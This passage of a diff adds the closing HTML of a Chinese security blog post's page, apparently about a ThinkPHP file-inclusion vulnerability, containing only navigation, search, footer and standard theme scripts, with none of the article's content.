+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2023/01/28/C-%E7%8E%AF%E5%A2%83%E4%B8%8B%E9%92%A9%E5%8F%96API%E5%87%BD%E6%95%B0/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>C++环境下钩取API函数</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2022/12/08/GadgetInspector%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">
+                        <span>GadgetInspector源码学习</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "ThinkPHP多语言模块文件包含漏洞&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
